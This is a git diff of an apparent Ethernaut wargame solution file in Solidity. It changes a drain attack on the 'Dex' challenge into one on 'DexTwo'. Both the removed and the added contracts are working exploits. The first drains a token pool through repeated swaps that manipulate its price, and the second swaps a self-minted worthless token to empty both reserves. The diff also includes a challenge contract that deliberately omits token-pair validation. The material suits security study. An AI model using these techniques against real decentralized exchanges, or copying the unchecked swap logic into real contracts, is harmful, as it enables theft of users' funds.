@@ -6,8 +6,8 @@ import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
 
 /**
- * @title 22. DEX
- * @dev Drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
+ * @title 23. DEX
+ * @dev Drain all 2 tokens from the contract.
  */
 
 interface IDex {
@@ -17,12 +17,6 @@ interface IDex {
 
     function swap(address from, address to, uint256 amount) external;
 
-    function getSwapPrice(
-        address from,
-        address to,
-        uint256 amount
-    ) external view returns (uint256);
-
     function approve(address spender, uint256 amount) external;
 
     function balanceOf(
@@ -31,52 +25,42 @@ interface IDex {
     ) external view returns (uint256);
 }
 
-/*
- * 0. Approve the newly deployed contract to transfer token1 & token2
- * --------------------------------------------------------------------
- * await contract.approve("0x63756907c4b701acE7B29E3Fc8cCaFF5fd98b54e", "100000000000000000000");
- */
+contract FreeToken is ERC20 {
+    constructor(address _ethernaut_DexTwo) ERC20("FreeToken", "FTK") {
+        // Pass the address of your contract to receive the tokens directly
+        _mint(_ethernaut_DexTwo, 10000000 * 10 ** decimals());
+    }
+}
 
-contract Ethernaut_Dex {
-    IDex private idex = IDex(0x98E7fF2DfFF412D7E9e03A51AE0f63f9e983C3cE);
-    address private immutable token1 = idex.token1();
-    address private immutable token2 = idex.token2();
+contract Ethernaut_DexTwo {
+    IDex private idex = IDex(0x56aA45E6eAA6178623B662e49eeb77c44d64e900); // Replace with you DexTwo instance
+    address private freeToken;
+    address private token1 = idex.token1();
+    address private token2 = idex.token2();
 
-    function attack() public {
-        // 2. Transfer all tokens to the contract (!!! Require approval for this to work !!!)
-        IERC20(token1).transferFrom(msg.sender, address(this), 10);
-        IERC20(token2).transferFrom(msg.sender, address(this), 10);
-
-        // 3. Swap the tokens multiple times to profit from the "artificial" price
-        idex.approve(address(idex), type(uint256).max);
-        _swap(token1, token2); // 10 in | 100 - 100 | 10 out (10*100/100 = 10)
-        _swap(token2, token1); // 20 in | 110 - 90  | 24 out (20*110/90 = 24)
-        _swap(token1, token2); // 24 in | 86  - 110 | 30 out (24*110/86 = 30)
-        _swap(token2, token1); // 30 in | 110  - 80 | 41 out (30*110/80 = 41)
-        _swap(token1, token2); // 41 in | 69  - 110 | 65 out (41*110/67 = 65)
-
-        // 4. Swap with the exact amount to empty the reserves of token1
-        // Final swap:
-        // x in | 110 - 45 | 110 out (x*110/45 = 110)
-        // x = 110*45/110 = 45
-        idex.swap(token2, token1, 45);
-
-        // 5. Transfer tokens back
-        IERC20(token1).transfer(
-            msg.sender,
-            idex.balanceOf(token1, address(this))
-        );
-        IERC20(token2).transfer(
-            msg.sender,
-            idex.balanceOf(token2, address(this))
-        );
-
-        require(idex.balanceOf(token1, address(idex)) == 0, "Attack failed!");
+    // 1. Set address of our freeToken
+    function setFreeToken(address _freeToken) public {
+        freeToken = _freeToken;
     }
 
-    function _swap(address tokenIn, address tokenOut) private {
-        uint256 amount = idex.balanceOf(tokenIn, address(this));
-        idex.swap(tokenIn, tokenOut, amount);
+    function attack() public {
+        idex.approve(address(idex), type(uint256).max);
+        IERC20(freeToken).approve(address(idex), type(uint256).max);
+
+        // 2. Send 100 freeToken, then empty the reserves of token1
+        IERC20(freeToken).transfer(address(idex), 100);
+        idex.swap(freeToken, token1, 100);
+
+        // 3. Next, empty the reserves of token2
+        // The contract has now 200 freeTokens and 100 token2
+        // x in | 200 - 100 | 100 out (x*100/200)=100 so: x=100/0.5 so: x=200
+        idex.swap(freeToken, token2, 200);
+
+        require(
+            IERC20(token1).balanceOf(address(idex)) == 0 &&
+                IERC20(token2).balanceOf(address(idex)) == 0,
+            "Hack failed!"
+        );
     }
 }
 
@@ -86,7 +70,7 @@ contract Ethernaut_Dex {
                         CHALLENGE CONTRACT
 ////////////////////////////////////////////////////////////////*/
 
-contract Dex is Ownable {
+contract DexTwo is Ownable {
     address public token1;
     address public token2;
 
@@ -97,7 +81,7 @@ contract Dex is Ownable {
         token2 = _token2;
     }
 
-    function addLiquidity(
+    function add_liquidity(
         address token_address,
         uint256 amount
     ) public onlyOwner {
@@ -106,21 +90,16 @@ contract Dex is Ownable {
 
     function swap(address from, address to, uint256 amount) public {
         require(
-            (from == token1 && to == token2) ||
-                (from == token2 && to == token1),
-            "Invalid tokens"
-        );
-        require(
             IERC20(from).balanceOf(msg.sender) >= amount,
             "Not enough to swap"
         );
-        uint256 swapAmount = getSwapPrice(from, to, amount);
+        uint256 swapAmount = getSwapAmount(from, to, amount);
         IERC20(from).transferFrom(msg.sender, address(this), amount);
         IERC20(to).approve(address(this), swapAmount);
         IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
     }
 
-    function getSwapPrice(
+    function getSwapAmount(
         address from,
         address to,
         uint256 amount
@@ -130,8 +109,8 @@ contract Dex is Ownable {
     }
 
     function approve(address spender, uint256 amount) public {
-        SwappableToken(token1).approve(msg.sender, spender, amount);
-        SwappableToken(token2).approve(msg.sender, spender, amount);
+        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
+        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
     }
 
     function balanceOf(
@@ -142,7 +121,7 @@ contract Dex is Ownable {
     }
 }
 
-contract SwappableToken is ERC20 {
+contract SwappableTokenTwo is ERC20 {
     address private _dex;
 
     constructor(
